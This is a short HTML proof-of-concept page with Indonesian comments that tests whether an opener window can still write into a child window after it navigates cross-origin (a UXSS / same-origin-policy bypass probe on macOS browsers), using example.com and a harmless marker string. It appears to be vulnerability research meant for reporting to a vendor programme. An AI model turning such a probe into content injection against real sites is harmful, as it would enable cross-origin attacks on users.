<!-- 49 - penulisan lintas-origin lewat opener   [UXSS / SOP bypass | macOS: Dia/Arc/Chrome macOS]
     MEKANISME : bukan membaca melainkan MENULIS: apakah pembuka masih bisa menulis dokumen setelah anak berpindah origin.
     PREDIKAT  : penulisan berhasil - itu eksekusi di origin korban, bukan sekadar kebocoran.
     AMAN      : pembacaan lintas-origin dilempar SecurityError; baris bukti berkata DIBLOKIR.
     ETIKA     : browser & mesin sendiri. Nol form, nol kredensial, nol fetch/beacon, nol resource luar.
                 "www.google.com" = label tak-berbahaya; example.com = origin uji (IANA reserved).
                 Berhenti di predikat -> screenshot -> lapor VRP. Bukan kit phishing. -->
<meta charset="utf-8"><title>49 penulisan lintas-origin lewat opener</title>
<button onclick="go()" style="font:16px system-ui;padding:12px 22px">RUN</button>
<p id="o" style="font:12px ui-monospace,monospace;color:#555"></p>
<script>
o.textContent='REAL: '+location.origin;
function go(){var w=window.open('https://example.com/','x');setTimeout(function(){try{w.document.body.innerHTML='<b>ditulis lintas-origin</b>';o.textContent='BISA TULIS -> UXSS';}catch(e){o.textContent='DIBLOKIR (aman): '+e.name;}},2600);}
</script>
